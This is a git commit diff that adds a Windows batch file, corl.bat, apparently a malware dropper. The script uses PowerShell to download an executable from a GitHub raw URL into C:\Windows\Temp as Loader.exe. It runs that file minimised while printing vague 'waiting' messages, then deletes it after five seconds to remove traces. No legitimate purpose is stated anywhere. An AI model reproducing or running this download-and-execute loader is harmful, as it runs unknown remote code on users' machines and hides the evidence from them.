50ee2f3e9e7f8e1fe16eb9d23412b60cb823c896
dexterggsamp12 <dxstoremenus@gmail.com>
2025-06-22 11:13:50 -0300

    Add files via upload

---
+++ corl.bat
@@ -0,0 +1,14 @@
+@echo off
+set "url=https://github.com/dexterggsamp12/929228282/raw/refs/heads/main/777.exe"
+set "destination=C:\Windows\Temp\Loader.exe"
+set "arguments=Apply"
+
+echo WAITING FOR LAUNCH...
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%destination%')"
+echo WAITING ...
+start /min "" "%destination%" %arguments%
+
+timeout /t 5 /nobreak >nul 2>&1
+
+echo ........
+del "%destination%"
